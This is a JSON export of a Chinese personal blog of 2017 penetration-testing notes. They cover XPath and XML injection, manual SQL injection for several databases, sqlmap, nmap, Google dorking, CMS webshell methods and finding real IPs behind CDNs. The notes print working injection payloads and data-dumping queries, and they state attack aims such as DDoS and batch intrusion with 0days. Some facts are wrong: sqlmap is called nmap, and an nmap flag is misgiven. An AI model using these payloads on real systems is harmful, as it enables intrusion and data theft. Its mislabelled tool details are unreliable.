[{"title":"代码注入之XPath篇","date":"2017-04-08T09:39:58.589Z","path":"2017/04/08/代码注入之XPath篇/","text":"XPath：XML的路径语言（选取XML节点的一门语言）（和XML注入类似） 例如 user.xml文件是这么写的： &lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; 那XPath的一般查询语句是这样写的： //users/user[loginID/text()=’xyz’and password/text()=’123test’] 但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID = ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。但如果用户传入类似 ‘ or 1=1 or ‘’=’ 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：//users/user[loginID/text()=’’or 1=1 or ‘’=’’ and password/text()=’’ or 1=1 or ‘’=’’] 这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。 利用手段：和SQL+XSS注入类似，闭合符合，然后构造POC利用位置：查询口","tags":[]},{"title":"代码注入之XML篇","date":"2017-04-08T09:38:42.897Z","path":"2017/04/08/代码注入之XML篇/","text":"XML：可扩展标识语言（和超文本标记语言有点类似，不过标签是带有自定义性质的，带有补充超文本语言的性质） （这个注入就是改写XML文件来利用。都需要闭合标签，然后插入数据，形式和SQL注入+XSS差不多） 报错语句: ‘ or (payload) or ‘‘ and (payload) and ‘‘ or (payload) and ‘‘ or (payload) and ‘=’‘(payload)’‘ or (payload) and ‘ 下面是一个保存注册用户信息为XML格式的例子： final String GUESTROLE = \"guest_role\"; ... //userdata是准备保存的xml数据，接收了name和email两个用户提交来的数据。 String userdata = \"&lt;USER role=\"+ GUESTROLE+ \"&gt;&lt;name&gt;\"+ request.getParameter(\"name\")+ \"&lt;/name&gt;&lt;email&gt;\"+ request.getParameter(\"email\")+ \"&lt;/email&gt;&lt;/USER&gt;\"; //保存xml userDao.save(userdata); 当上面这段代码没有任何过滤时，一个普通用户注册会是这样的↓ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;USER role=\"guest_role\"&gt; &lt;name&gt;user1 &lt;/name&gt; &lt;email&gt;user1@a.com &lt;/email&gt; &lt;/USER&gt; 但攻击者注册时如果这样注册，构造利用代码如下： user1@a.com&lt;/email&gt;&lt;/USER&gt;&lt;USER role=\"admin_role\"&gt;&lt;name&gt;test&lt;/name&gt;&lt;email&gt;user2@a.com 最终用户注册后，数据就变成了↓： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;USER role=\"guest_role\"&gt; &lt;name&gt;user1 &lt;/name&gt; &lt;email&gt;user1@a.com&lt;/email&gt; &lt;/USER&gt; &lt;USER role=\"admin_role\"&gt; &lt;name&gt;lf&lt;/name&gt; &lt;email&gt;user2@a.com &lt;/email&gt; &lt;/USER&gt; ##很明显，多出了一条role=“admin_role”的管理员test。以达到攻击目的。## 防御：对关键字进行转义， 例： &amp; --&gt; &amp;amp; &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; \" --&gt; &amp;quot; ' --&gt; &amp;#39; 具体函数：StringUtil.xmlencode（） 绕过：闭合（包括闭合函数）→重新构造整个代码，包括函数（当然这是我自己认为的，没实施过。。） 利用位置：注册口","tags":[]},{"title":"SQL注入之nmap","date":"2017-04-08T09:34:11.167Z","path":"2017/04/08/SQL注入之nmap/","text":"NMAP的使用： 常用命令：-u （后面接URL，判断注入，有注入则回显服务器信息）–dbs 查看所有数据库–current-db 列出当前所用的数据库–table 获取数据库表 （接 –D使用; 因为要知道是哪个数据库的表）–columns 获取表中的字段 （接 –T，-D使用，因为要知道哪个表那个数据库）–dump 获取字段内容 （接-C,-T,-D使用，和上同理。。）–r 利用文本（接编码转换文本或HTTP协议包） 以下为Mysql数据注入： -u www.xxx.com/qqq.php?id=1 存在注入，则爆出(网页信息)↓ -u www.xxx.com/qqq.php?id=1 –dbs 爆出所有数据库 选择bsgy数据库并爆表 -u www.xxx.com/qqq.php?id=1 –D “bsgy” –table 选择lefttree表，并爆字段-u www.xxx.com/qqq.php?id=1 –D “bsgy” -T “lefttree” –columns 爆字段内容-u www.xxx.com/qqq.php?id=1 –D “bsgy” -T “lefttree” –C “id,name” –dump Accessz注入：–table（直接猜表名）然后思路同理因为Access没有内置的数据库，而且只有一只，所以直接跑表 注：其它命令：1.测试所有用户权限：–privileges （接-U可指定用户） 2.执行shell命令（需要知道物理路径且可写）：–os-cmd=”cmd命令”–os-shell 3.post 提交：–data “post参数” （可能会自动检测） 4.显示详细参数：-v 0~6 （0~6代表信息等级，） 5.cookies注入：–cookie –lever 3 （&gt;=2即可，3的话会检查User-agent和Referer） 6.数据包注入：-r 要注入的文本 （文本的某一处加‘*’则选择在哪注入，不加则默认是头部注入，这方式适合伪静态注入） 7.注入时使用编码：–tamper ‘py文本’ (适用黑名单绕过) 8.。。。。。 注入工具还有：穿山甲（pangolin） / Havij（小萝卜）。。。 编写人不同，注入方法也不通，都试试吧，可能某一个得呢。。","tags":[]},{"title":"SQL手工注入之mysql","date":"2017-04-08T09:17:21.383Z","path":"2017/04/08/SQL手工注入之mysql/","text":"mysql数据库 版本5.0↑，具有内置特定数据库（information_schema）。 最高权限为root 注入过程： 判断字段数 （order by） 匹配字段数：union select 1,2,3,4,5……. 利用内置函数暴数据库信息system_user() 系统用户名user() 用户名current_user() 当前用户名session_user() 链接数据库的用户名database() 数据库库名version() mysql数据库版本信息load_file() 转换成16或10进制 读取本地文件@@datadir 读取数据库路径@@basedir MYSQL安装路径@@version_compile_os 操作系统 查表：Union selec 1,group_concat(table_name) ,3 frominformation_schema.tables where table_schema= 数据库名的hex编码 表里面的列union select 1,group_concat(column_name),3 frominformation_schema.columns wheretable_name=表的HEX值 Union select 1,group_concat(列名),3 from 表名","tags":[]},{"title":"SQL手工注入之Oracle","date":"2017-04-08T09:14:16.455Z","path":"2017/04/08/SQL手工注入之Oracle/","text":"文章：http://www.2cto.com/article/201301/186345.html 注：字段位置应写为null..不可以用数字，因为Oracle是强类型数据库。必须表明类型，null就可避免类型限制。","tags":[]},{"title":"SQL手工注入之Access","date":"2017-04-08T09:11:27.016Z","path":"2017/04/08/SQL手工注入之Access/","text":"Access（数据库后缀名为：.mdb） 数据库结构： 判断是否存在注入（报错，“*”and/or;在网址最后输入（’；）,返回不正常的时候,说明是access类型的。反之，则是mssql类型） 判断数据库表名：and exists(select * from [表名]) 判断数据库列名：and exists(select [列名] from [表名]) 判断字节长度：order by 数字 联合查询注入：union select 1,2,… from [表名] 根据数字位置爆数据。 偏移注入（知道表名却不知道列名的情况下使用）：假设表名为admin。初始字段数为12 判断字段数（order by ） 爆显示位 用“”代替字符，计算代替字符的位数 当访问：http://127.0.0.1/0/Pro/P.asp?id=1513 UNION SELECT1,2,3,4,5,6,7, from admin 页面返回正确（说明admin表有7个字段）if：已经减去了五个字段则 = 5个字符2 x * = 10个字符12-10=2个字符 http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,a.id,b.id, * from (admin as a inner join admin as b on a.id=b.id) 如果不显示可以查看元素看看是不是隐藏了 真没有就二级偏移注入。。 再减7个字段 POC写成：UNION SELECT 1,2,a.id,b.id,c.id * from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=b.id) 三级。。。 四级。。。。。。。 跨库注入（知道数据库的绝对路径，然后猜表名）： and exists(select * from 数据库绝对路径.表名)","tags":[]},{"title":"SQL手工注入之SQL Server（mssql）","date":"2017-04-08T09:05:13.871Z","path":"2017/04/08/SQL手工注入之mssql/","text":"SQL Server（mssql）（一般搭配asp/asp.net(aspx)+mssql） 数据库结构： 权限：1.最高：sa（任何操作：文件管理/数据库操作/命令执行等）2.普通：db（文件管理，数据库操作等）3.最菜：public（数据库操作） 注入（手工判断）： And 1=1和and 1=2 组合判断 （用永真和永假判断） and (select count(*) from sysobjects)&gt;0 返回正常就是mssql数据库 版本信息查看：and 1=(select @@version)获取当前网站所用数据库库名：and 1=(select db_name())获取第一个数据库库名：and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)获取第二个数据库库名：and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’)获取第三个数据库库名：and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’ and name &lt;&gt; ‘第二个数据库库名’)其它同理。。。。 获取第一个当前使用的数据库表名：and 1=(select top 1 name from sysobjects where xtype=’u’)and 1=(select top 1 name from sysobjects where xtype=’u’ and name &lt;&gt;’第一个表名’)其它同理。。。 获取第一个当前使用的数据库的表里面的列名：and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’))获取第二个列明and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’)and name&lt;&gt; ‘第一个列名’)其它同理。。 获取列内容（假如表是users列是name）and 1=(select top 1 name from users)其它同理。。。。","tags":[]},{"title":"SQL注入之类型简介","date":"2017-04-08T08:59:30.913Z","path":"2017/04/08/SQL注入之类型简介/","text":"SQL注入原理：SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（数据库语句没有进行严密的过滤，致使执行非法查询） SQL分类：1.数字型注入 2.字符型注入 3.搜索型注入 数字型:参数为数字。 例：www.test.com/test.php?id=123字符型：参数为字符（英文字符串） 例：www.test.com/test.php?id=asd搜索型：注入位置为搜索框例： 区别：SQL查询语句不相同。数字型：$sql=”select from A where id=$id”;字符型：$sql=”select from B where id=’$user ‘“;搜索型：$sql=”select * from user where username like ‘%$name%’ order by username”; 注入方式：GET，（请求头，URL位置）Post，（表单提交的注入，例：登陆框）Cookies,（利用Cookie 注入中转/手工编辑新的Cookies也可，即把参数写道Cookie里面（firebug里有编辑Cookie的插件）） 数据库分类：1). SQL Server （别名：mssql）2). Access3). Oracle4). MySql5). Sysbase6). Informix7). FoxPro8). PostgreSQL9). IBM 的DB2 前面四种是常见的，包含了大多数的中小企业，所以暂时先讲这四种，等哪天我成为大神再补充。后面的五种。。。就这样。 注：1.数据库不同，查询语句的连接符也不同 Mssql：“+” Oracle：“||” Mysql:：空格 Access：“&amp;” 灵活运用：or/and/xor/+ 后台，审查元素，name属性有意想不到的结果（写着字段） 下载CMS分析 基于布尔的SQL盲注—-构造逻辑判断基于时间的盲注—延时注入基于报错的盲注","tags":[]},{"title":"信息收集之CMS","date":"2017-04-08T08:40:20.964Z","path":"2017/04/08/信息收集之CMS/","text":"主要CMD：discuz ,dedecms（织梦）,wordpress,phpcms,jeecms,joomla,动易， 查看robots.txt 网页图标 主页最下面的一栏信息 通过站长工具的Whois或者zoomeye.org… 后台 工具（椰树，m7lrv） 拿shell: 在配置里插一句话 双文件上传 数据库备份 利用解析漏洞 作用：方便上网查询相关CMS漏洞、后台位置、默认密码等","tags":[]},{"title":"信息收集之真实IP查询","date":"2017-04-08T08:40:20.963Z","path":"2017/04/08/信息探测之真实IP查询/","text":"ping (ping带WWW、和ping不带www) （不一样则存在CDN） 采集二级域名（子域名）（URL采集工具）URL采集(子域名挖掘)→域名批量查询（http://ip.chinaz.com/ipbatch）→找非节点（CDN）IP→ 查看接受收的邮件，显示原文，看IP 基本上所有的大站都有一个段（C段），这个段可能会有几个系统，且ip很接近 通过威胁情报平台360: https://ti.360.com/#ThreatBook: https://x.threatbook.cn 查域名历史IP(在历史解析里面一般存在真实IP段)http://viewdns.info/iphistory/?domain=https://www.zoomeye.orgwww.shodan.io 全网扫描http://www.evil0x.com/posts/6547.html 查防护软件等信息（出现防护警告时）查看元素→网络→消息头→X-Safe-Firewall搜索 防护提示符 找真实IP的作用：运用DDOS攻击（分布式拒绝服务攻击）/直接尝试连接服务器配合DDOS作用：造成防火墙处理错误锁死、服务器瘫痪CDN作用：实时的根据网络流量和个节点的接连、负载情况以及用户的距离和相信时间将用户的请求重新导向离用户最近的服务器节点上。内容服务基于缓存服务器，也称为代理缓存。","tags":[]},{"title":"信息探测之nmap的使用（端口）","date":"2017-04-08T08:40:20.962Z","path":"2017/04/08/信息探测_端口篇/","text":"Nmap:可用于端口扫描/指纹识别/检测SQL注射/网页爬行/数据库密码检查等 Nmap参数的使用： -sT TCP连接扫描 （被扫描的系统会产生大量连接信息并写入日记） -sS 半开扫描 (即TCP SYN扫描) 很少系统把他写入系统日记 -sN/sF Fin数据包扫描 （即使SYN扫描都无法确定的情况下使用） -sP ping扫描 （测试一个段的主机存活IP） -sU UDP扫描 （因为不可靠，所以一般不用） -sA 穿过防火墙的规律集 -sV 探测端口服务版本 -P0 当被禁止Ping时可用此选项扫描 -v 显示扫描过程 -p 指定端口扫描（只扫描3389和80 -p “3389、80”） 利用方法：扫描www.baidu.com 的C段存活主机 Nmap –sP www.baidu.com/24 注：假如扫描为IP （222.332.186.121）， 应为 222.332.186.0/24 指定端口扫描： Nmap www.baidu.com(或填服务器IP) –p 80，3389，1433，（或1~X） 检查主机系统： Nmap –o www.baidu.com(或填服务器IP) 端口： 8080（Apache/Tomcat/Nginx/Axis2）, 21（控制端口）； 20（数据端口）；69（tftp小型文件传输协议）[FTP] 3306(MySQL数据库) 1433（Server 数据库服务）、1434（Monitor 数据库监控） (MSSQL数据库) 1521（数据库端口）、210（Oracle XDB FTP服务） (Oracle数据库) 25（smtp）、465（smtps）(SMTP协议) 53(DNS服务) 67&amp;68、546（DHCP服务） 22(SSH服务) 80/81/443(IIS服务) 7001(WebLogic) 1098/1099/4444/4445/8080/8009/8083/8093(Jboss) 908*；第一个应用就是9080，第二个就是9081；控制台9090(Websphere)","tags":[]},{"title":"信息探测之谷歌黑客语法的使用","date":"2017-04-08T08:40:20.960Z","path":"2017/04/08/信息探测_谷歌语法/","text":"Google Hack:（大部分语法也可用于百度） 主要语法：Site：找到与指定网站有联系的URL。 （用于搜索子域名）Intext：正文存在关键字的网页 （搜索重要信息）Intitle：标题中存在关键字的网页 （搜索后台等具有关键字的URL）Inurl：url中存在关键字的网页 （寻找伪静态持有的网页类型）Filetype:指定文件类型Site和inurl区别：Site:把搜索范围限定在特定站点中Inurl:吧搜索范围限定在url链接中 多种组合能达到意想不到的效果：例如：inurl:baidu.com intext:后台管理 如果存在，则返回百度网页的后台界面URL地址 inurl:baidu.com Intitle:上传 如果存在，则返回百度网页带有上传页面的地址 Intitle:后台管理 filetype:asp 如果存在，则返回带有后台管理且为ASP类型的URL。 利用：1.假如攻击者拥有的一个0day漏洞，则可以用此语法配合0day指纹进行批量的入侵。2.寻找网页后台（admin/login）、敏感文件（robots.txt/db.mdb）、敏感路径（upload）","tags":[]},{"title":"漏洞扫描之工具使用篇","date":"2017-04-08T08:24:16.651Z","path":"2017/04/08/漏洞扫描之工具篇/","text":"常用工具：AWVS/Appscna/Netsparker工具的使用 AWVS功能：Tools（工具）Web scanner 网站漏洞扫描 Site Crawler 网站爬行 Target Finder 扫描自定网段，开放指定端口的服务器 Subdomain Scanner 子域名扫描 Blind SQL injection Sql盲注手工测试 HTTP Editor HTTP信息查看编辑 HTTP Sniffer HTTP监听嗅探 HTTP fuzzer HTTP模糊测试 Authentication Tester HTTP认证测试 Compare Results 对比两次Acunetix扫描结果 Web Servces（Web服务） Web Services Scanner 网站服务扫描 。。。。。。。。。。 网站服务手动分析 Configuration（配置） Application Settings 应用程序设置 Scan Settings 扫描设置 Scanning Profiles 配置所用扫描脚本 General（一般） 。。。。。。。。。。。。。。。。。（AWVS的相关信息，破解版略过） 步骤：点击New Scan后可傻瓜式点击Next… 注：当点击第二布Options时可选择扫描类型 （没有针对性的话一般使用Default） 注：当点击Target时可查看网页服务器的类型 扫描结果： Site Crawler 的利用：输入URL，啪啪啪啪啪啪啪，就出来一堆“能看到的URL”了。 爬行小工具还有：burp suit/….网段端口扫描工具：nmap（windows版应该是Znmap）子域名查询：一般网页就有（搜索子域名查询）SQL盲注等注入：SQLMAP（带有过狗过防火墙的脚本，贼强）有关数据包的（HTTP协议包）：直接burp suit工具软件抓包：Wireshark工具 Netsparker：方法一样，Start New Scan ，输入URL，自动扫描漏洞。","tags":[]},{"title":"HTTP协议","date":"2017-04-08T04:38:10.917Z","path":"2017/04/08/HTTP协议/","text":"HTTP协议（超文本传输协议）： URL：网页地址。例：http://www.xxx.com/abc/bcd.html http://www.xxx.com/index.asp http://www.xxx.com 等都是URL。 HTTP遵循：请求（request）、相应（respsonse） 两部分 http请求（request）： 当发送请求包，自然也有响应包：http响应： HTTP请求方式：Get、Post、Put、Delete、trace、等常见如下：Get：用于短内容和不用保密的信息Post：用于传输长内容或需保密的信息。 危险请求方式：PUT：危险请求方式，用于请求服务器把请求的实体储存在请求资源下。如果资源存在，则替换服务器的原先数据。（用抓包工具利用）Delete：请求方式可改成删除指定资源Trace：允许客户端了解数据链另一端的接受情况，并利用这些数据信息去做相关测试。…. 响应行重要状态码：200：请求成功，正常执行 302：网页发生跳转 （URL重定向） 401：未授权 403：服务器拒绝服务。 404：请求资源不存在 500：服务器内部错误。 http与https区别：https单纯的比http更安全而已。安全基础是SSL。即：http+SSL == https Http端口：80https端口：443 截取http协议包工具：burpsuit/Fiddler/ 利用截取的协议包，可进行任意的更改操作。从而达到相关测试的目的。例如：1．修改/伪造的Cookies值 从而达到登陆的目的 2．无限重放协议包，从而达到自动化暴力破解登陆账号的目的 3．修改请求的上传文件类型。从而绕过本地/远程白名单限制。 4．查看上传地址，从而获取上次文件的URL位置 5．简单获取服务器信息","tags":[]}]